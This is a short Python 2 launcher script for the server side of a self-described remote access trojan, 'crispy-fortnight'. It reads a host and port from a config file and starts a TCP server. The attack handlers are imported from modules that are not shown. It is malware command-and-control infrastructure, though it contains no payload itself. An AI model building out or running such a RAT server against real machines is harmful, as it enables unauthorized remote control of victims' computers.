import argparse
import ConfigParser
import logging

from crispy.network.server_handler import CrispyTCPServerHandler
from crispy.lib.server import CrispyTCPServer  
    
def run(host, port):       
    try:
        server = CrispyTCPServer((host, port), CrispyTCPServerHandler)
        logging.info("[+] Started server on {0}:{1}".format(server.server_address[0], server.server_address[1]))
        print 
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()
        server.socket.close() 

def main():
    argp = argparse.ArgumentParser(description="Run crispy-fortnight (Python RAT) server.",
                                     epilog="Do NOT use this for nefarious purposes!", 
                                     prog="crispy",)
    argp.add_argument("--config",
                        dest="config_file",
                        help="Path to crispy config file",
                        metavar="CONFIG_FILE",
                        required=True,
                        type=str)
    argp.add_argument('--version', 
                        action='version', 
                        version='1.0')
    args = argp.parse_args()
    
    config_file = args.config_file
    logging.info("Reading configuration from {0}".format(config_file))
    config = ConfigParser.ConfigParser()
    config.read(args.config_file)
    
    host = config.get('NETWORK', 'host')
    port = config.getint('NETWORK', 'port')
    run(host, port)
    
if __name__ == "__main__":
    main()